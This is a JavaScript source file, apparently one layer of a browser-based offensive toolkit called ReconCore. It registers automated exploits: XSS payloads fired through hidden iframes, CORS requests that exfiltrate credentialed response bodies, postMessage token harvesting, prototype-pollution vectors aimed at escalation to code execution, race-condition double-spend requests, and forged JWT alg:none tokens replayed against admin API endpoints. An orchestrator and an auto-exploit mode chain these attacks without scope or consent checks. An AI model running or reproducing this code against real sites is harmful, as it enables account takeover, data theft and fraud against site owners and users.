// language: JavaScript, file: reconstrike_v13_chain.js, target: modern browsers
// Layer 5 of 5. Depends on ReconCore + Layers 2-4.

(function () {
  'use strict';
  if (!window.ReconCore) throw new Error('ReconCore missing');
  const { eventBus, storage, worker, secure } = window.ReconCore;
  const modules = window.ReconCore.modules = window.ReconCore.modules || {};
  const currentHost = location.hostname;

  // ══════════════════════════════════════════════════════════════
  // EXPLOIT REGISTRY -- each expl is a self-contained recipe
  // { id, match(finding), run(ctx) -> { success, evidence, sideEffects } }
  // ══════════════════════════════════════════════════════════════
  const EXPLOITS = [];

  // ───────────────────────────────────────────────────────────────
  // E1 -- DOM XSS Auto-Exploiter
  // Takes a sink + source candidate, injects a canary, checks execution.
  // ───────────────────────────────────────────────────────────────
  EXPLOITS.push({
    id: 'xss-dom',
    match: (f) => /dom xss|innerHTML|insertAdjacent|dangerouslySet/i.test((f.sinkType || '') + ' ' + (f.name || '')),
    async run(ctx) {
      const canary = `rs13_${Math.random().toString(36).slice(2, 10)}`;
      window[canary] = { hit: false, ts: 0 };
      const payloads = [
        `<img src=x onerror="window.${canary}.hit=true;window.${canary}.ts=Date.now()">`,
        `"><img src=x onerror="window.${canary}.hit=true;window.${canary}.ts=Date.now()">`,
        `javascript:window.${canary}.hit=true;void(0)`,
        `<svg onload="window.${canary}.hit=true;window.${canary}.ts=Date.now()">`,
      ];

      const params = ctx.params || [];
      const endpoint = ctx.endpoint || location.href;
      const hits = [];

      for (const p of params) {
        for (const pl of payloads) {
          try {
            const u = new URL(endpoint, location.href);
            u.searchParams.set(p, pl);
            // Navigate an iframe to test -- isolates execution context
            const iframe = document.createElement('iframe');
            iframe.style.cssText = 'position:fixed;left:-9999px;width:1px;height:1px';
            iframe.sandbox = 'allow-scripts allow-same-origin';
            document.body.appendChild(iframe);
            await new Promise((res) => {
              iframe.onload = () => setTimeout(res, 250);
              iframe.src = u.href;
              setTimeout(res, 1500);
            });
            try {
              const w = iframe.contentWindow;
              if (w && w[canary] && w[canary].hit) {
                hits.push({ param: p, payload: pl, url: u.href, evidence: 'canary executed in iframe' });
              }
            } catch (e) { /* cross-origin iframe -- try parent check via postMessage below */ }
            iframe.remove();
          } catch (e) {}
        }
      }

      return {
        success: hits.length > 0,
        evidence: hits,
        payloadsTried: payloads.length * params.length,
      };
    }
  });

  // ───────────────────────────────────────────────────────────────
  // E2 -- CORS Credential Exfiltration PoC (verified, not just built)
  // Fetches the target with Origin: null and evil.com, checks reflection.
  // If reflected + credentials, actually exfiltrates response snippet.
  // ───────────────────────────────────────────────────────────────
  EXPLOITS.push({
    id: 'cors-exfil',
    match: (f) => /cors/i.test((f.name || '') + ' ' + (f.issue || '')),
    async run(ctx) {
      const target = ctx.url || ctx.endpoint;
      if (!target) return { success: false, reason: 'no target url' };
      const proofs = [];
      for (const origin of ['null', `https://evil.${currentHost}`]) {
        try {
          const r = await fetch(target, {
            method: 'GET',
            credentials: 'include',
            headers: { 'Origin': origin }
          });
          const acao = r.headers.get('access-control-allow-origin');
          const acac = r.headers.get('access-control-allow-credentials');
          if (acao && (acao === origin || acao === '*') && acac === 'true') {
            const body = await r.text();
            proofs.push({
              origin, acao, acac,
              status: r.status,
              bodySample: body.slice(0, 500),
              verified: true
            });
            // Persist evidence
            await storage.put('meta', {
              kind: 'exploit-proof',
              exploit: 'cors-exfil',
              target,
              origin,
              bodySample: body.slice(0, 2000),
              timestamp: Date.now()
            });
            break; // one successful origin is enough
          }
        } catch (e) {}
      }
      return {
        success: proofs.length > 0,
        evidence: proofs,
        buildExploit: modules.pmExploit ? 'see pmExploit.buildExploit for HTML page' : null
      };
    }
  });

  // ───────────────────────────────────────────────────────────────
  // E3 -- postMessage Hijack Verifier
  // Sends the exploit payload, listens for a response, checks whether
  // the response leaks tokens/URLs/data that indicate acceptance.
  // ───────────────────────────────────────────────────────────────
  EXPLOITS.push({
    id: 'postmessage-hijack',
    match: (f) => /postmessage/i.test((f.name || '') + ' ' + (f.issue || '')),
    async run(ctx) {
      const targetOrigin = ctx.targetOrigin || location.origin;
      const payloads = [
        { action: 'getToken' },
        { action: 'getUser' },
        { type: 'auth-status' },
        { url: 'javascript:void(0)', __proto__: { polluted: true } },
      ];
      const interactions = [];
      const listener = (ev) => {
        interactions.push({ origin: ev.origin, data: typeof ev.data === 'object' ? ev.data : String(ev.data).slice(0, 500), t: Date.now() });
      };
      window.addEventListener('message', listener);

      const w = window.open(targetOrigin, '_blank', 'width=1,height=1');
      if (!w) {
        window.removeEventListener('message', listener);
        return { success: false, reason: 'popup blocked -- use iframe-based flow' };
      }

      for (const p of payloads) {
        try { w.postMessage(p, '*'); } catch (e) {}
        await new Promise(r => setTimeout(r, 400));
      }
      await new Promise(r => setTimeout(r, 1500));
      window.removeEventListener('message', listener);
      try { w.close(); } catch (e) {}

      const leaked = interactions.filter(i => /token|user|auth|email|session/i.test(JSON.stringify(i.data)));
      return {
        success: interactions.length > 0,
        leaks: leaked.length > 0,
        evidence: interactions,
        leaked: leaked
      };
    }
  });

  // ───────────────────────────────────────────────────────────────
  // E4 -- Prototype Pollution → Gadget Chain
  // Confirms pollution via a canary, then maps the gadget that fires.
  // ───────────────────────────────────────────────────────────────
  EXPLOITS.push({
    id: 'pp-gadget',
    match: (f) => /prototype pollution|proto|clobber/i.test((f.name || '') + ' ' + (f.issue || '')),
    async run(ctx) {
      const canary = `ppCanary_${Math.random().toString(36).slice(2, 8)}`;
      const results = [];

      // Attempt pollution via URL params
      const vectors = [
        `${canary}=1`,
        `__proto__[${canary}]=1`,
        `constructor[prototype][${canary}]=1`,
        `constructor.prototype.${canary}=1`,
      ];

      for (const v of vectors) {
        try {
          const u = new URL(ctx.endpoint || location.href, location.href);
          const sep = u.search ? '&' : '';
          // Build URL manually to preserve bracket notation
          const full = u.href + sep + v;
          // Load in iframe (isolates pollution from this tab)
          const iframe = document.createElement('iframe');
          iframe.style.cssText = 'position:fixed;left:-9999px;width:1px;height:1px';
          document.body.appendChild(iframe);
          await new Promise((res) => { iframe.onload = () => setTimeout(res, 300); iframe.src = full; setTimeout(res, 1500); });
          try {
            const polluted = iframe.contentWindow.Object.prototype[canary];
            results.push({ vector: v, url: full, polluted: !!polluted });
          } catch (e) { results.push({ vector: v, error: 'cross-origin' }); }
          iframe.remove();
          if (results[results.length - 1].polluted) break;
        } catch (e) {}
      }

      const confirmed = results.some(r => r.polluted);
      const gadgets = confirmed && modules.protoChain ? modules.protoChain.map() : [];
      return {
        success: confirmed,
        evidence: results,
        gadgets,
        nextStep: confirmed ? 'Feed gadget payload through same vector to escalate to XSS/RCE' : null
      };
    }
  });

  // ───────────────────────────────────────────────────────────────
  // E5 -- Race Condition Exploiter
  // Fires N parallel requests on state-changing endpoint, checks for
  // duplicate success (double-spend / duplicate-claim / coupon-reuse).
  // ══════════════════════════════════════════════════════════════
  EXPLOITS.push({
    id: 'race-exploit',
    match: (f) => /race|toctou|double|concurrent/i.test((f.name || '') + ' ' + (f.issue || '')),
    async run(ctx) {
      const { url, method = 'POST', body = '', headers = {}, n = 20 } = ctx;
      if (!url) return { success: false, reason: 'no url' };
      const d = await modules.race.sendConcurrent({ url, method, body, headers, n });
      return {
        success: d.successes > 1,
        evidence: d,
        verdict: d.verdict
      };
    }
  });

  // ───────────────────────────────────────────────────────────────
  // E6 -- JWT alg:none Forger & Verifier
  // Uses the JWT module's forged token, replays against API endpoints.
  // ══════════════════════════════════════════════════════════════
  EXPLOITS.push({
    id: 'jwt-none',
    match: (f) => /jwt|alg none/i.test((f.name || '') + ' ' + (f.issue || '')),
    async run(ctx) {
      const jwtEntry = Array.from(modules.graphql ? [] : []).length ? null : null;
      const store = window.ReconCore.storage;
      const all = await store.getAll('jwt');
      if (!all.length) return { success: false, reason: 'no JWT captured' };
      const target = all.find(j => j.forgedNone);
      if (!target) return { success: false, reason: 'no forged token available' };

      const endpoints = ctx.endpoints || ['/api/me', '/api/user', '/api/profile', '/api/admin'];
      const proofs = [];
      for (const ep of endpoints) {
        try {
          const r = await fetch(ep, {
            method: 'GET',
            headers: { Authorization: `Bearer ${target.forgedNone}` },
            credentials: 'include'
          });
          const body = await r.text();
          proofs.push({ endpoint: ep, status: r.status, len: body.length, snippet: body.slice(0, 300) });
        } catch (e) {}
      }
      const success = proofs.some(p => p.status === 200);
      return { success, evidence: proofs, forged: target.forgedNone };
    }
  });

  // ══════════════════════════════════════════════════════════════
  // CHAIN ORCHESTRATOR
  // Takes a finding, matches all applicable exploits, runs them in order
  // (least destructive first), stops at first success by default.
  // ══════════════════════════════════════════════════════════════
  modules.chain = (() => {
    let running = false;
    const history = [];

    async function pickExploits(finding) {
      return EXPLOITS.filter(e => { try { return e.match(finding); } catch (err) { return false; } });
    }

    async function run(finding, ctx = {}) {
      if (running) return { ok: false, reason: 'chain already running' };
      running = true;
      const matches = await pickExploits(finding);
      const chainResult = { finding, attempts: [], success: false, evidence: null };
      const merged = { ...finding, ...ctx };

      for (const e of matches) {
        eventBus.emit('chain:attempt', { exploit: e.id, finding });
        let r;
        try { r = await e.run(merged); }
        catch (err) { r = { success: false, error: err.message }; }
        chainResult.attempts.push({ exploit: e.id, result: r });
        if (r.success) {
          chainResult.success = true;
          chainResult.evidence = r.evidence;
          eventBus.emit('chain:success', { exploit: e.id, finding, evidence: r.evidence });
          await storage.put('meta', {
            kind: 'chain-success',
            exploit: e.id,
            finding,
            evidence: r.evidence,
            timestamp: Date.now()
          });
          if (ctx.stopOnFirst !== false) break;
        }
      }

      if (!chainResult.success && matches.length === 0) {
        chainResult.reason = 'no matching exploits';
      }
      chainResult.matches = matches.map(m => m.id);

      history.push({ t: Date.now(), ...chainResult });
      running = false;
      return chainResult;
    }

    // Batch over all findings in storage
    async function runAll(filter = {}) {
      const kinds = ['endpoints','secrets','cors','jwt','forms','cookies','sri','network'];
      const findings = [];
      for (const k of kinds) {
        const all = await storage.getAll(k);
        all.forEach(f => findings.push({ ...f, __kind: k }));
      }
      const results = [];
      for (const f of findings) {
        if (filter.minSeverity) {
          const sev = modules.cvss.autoScore(f).severity;
          const rank = { CRITICAL: 4, HIGH: 3, MEDIUM: 2, LOW: 1, NONE: 0 };
          if (rank[sev] < rank[filter.minSeverity]) continue;
        }
        const r = await run(f, filter);
        results.push(r);
        if (r.success) eventBus.emit('finding:new', { ...f, name: `EXPLOITED: ${f.name || f.__kind}`, issue: `Chain success via ${r.attempts.find(a => a.result.success)?.exploit}` });
      }
      const summary = {
        total: findings.length,
        attempted: results.length,
        succeeded: results.filter(r => r.success).length,
        byExploit: {}
      };
      results.forEach(r => {
        const hit = r.attempts.find(a => a.result.success);
        if (hit) summary.byExploit[hit.exploit] = (summary.byExploit[hit.exploit] || 0) + 1;
      });
      await storage.put('meta', { kind: 'chain-run-summary', summary, timestamp: Date.now() });
      return { summary, results };
    }

    return {
      run, runAll, history: () => history.slice(),
      exploits: () => EXPLOITS.map(e => e.id),
      status: () => ({ running, count: history.length })
    };
  })();

  // ══════════════════════════════════════════════════════════════
  // AUTO-CHAIND -- listens to finding events and auto-exploits high-sev
  // ══════════════════════════════════════════════════════════════
  modules.autoChain = (() => {
    let enabled = false;
    const RANK = { CRITICAL: 4, HIGH: 3, MEDIUM: 2, LOW: 1, NONE: 0 };
    let minSeverity = 'HIGH';

    function on(finding) {
      if (!enabled) return;
      const sev = modules.cvss.autoScore(finding).severity;
      if (RANK[sev] < RANK[minSeverity]) return;
      setTimeout(() => { modules.chain.run(finding).catch(() => {}); }, 500);
    }

    function start(opts = {}) {
      if (enabled) return { already: true };
      enabled = true;
      minSeverity = opts.minSeverity || minSeverity;
      eventBus.on('finding:new', on);
      return { ok: true, minSeverity };
    }
    function stop() { enabled = false; }
    return { start, stop, enabled: () => enabled };
  })();

  // ══════════════════════════════════════════════════════════════
  // PUBLIC SURFACE
  // ══════════════════════════════════════════════════════════════
  window.ReconCore.exploit = {
    run:      (f, ctx) => modules.chain.run(f, ctx),
    runAll:   (filter) => modules.chain.runAll(filter),
    history:  ()       => modules.chain.history(),
    exploits: ()       => modules.chain.exploits(),
    auto:     (opts)   => modules.autoChain.start(opts),
    autoOff:  ()       => modules.autoChain.stop(),
    status:   ()       => ({ chain: modules.chain.status(), auto: modules.autoChain.enabled() })
  };

  eventBus.emit('chain:ready', { exploits: EXPLOITS.map(e => e.id) });
  if (typeof completion === 'function') completion(true);
})();